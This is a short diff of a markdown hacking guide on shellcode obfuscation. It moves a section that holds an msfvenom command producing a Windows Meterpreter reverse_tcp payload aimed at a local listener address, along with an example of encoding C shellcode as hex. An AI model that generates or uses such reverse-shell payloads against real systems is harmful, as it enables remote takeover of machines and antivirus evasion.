@@ -37,16 +37,16 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 ## bash
 
-- build shellcode in **C** format
-
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f C -o shellcode.txt
-
 - encoding shellcode in **C** to **ANCII**
 
       \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode
 
       8b5a00270d0a              <-- ANCII shellcode
 
+
+- build shellcode in **C** format
+
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f C -o shellcode.txt
 
 - **parsing** shellcode data
 
